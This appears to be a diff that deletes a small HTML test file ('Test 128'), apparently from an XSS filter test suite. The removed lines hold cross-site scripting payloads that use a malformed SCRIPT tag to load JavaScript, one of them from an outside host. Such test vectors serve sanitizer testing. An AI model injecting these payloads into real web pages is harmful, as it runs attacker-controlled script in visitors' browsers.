@@ -1,4 +1,0 @@
-<HTML><HEAD></HEAD><BODY> Test 128.
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="alert.js"></SCRIPT>
-</BODY></HTML>
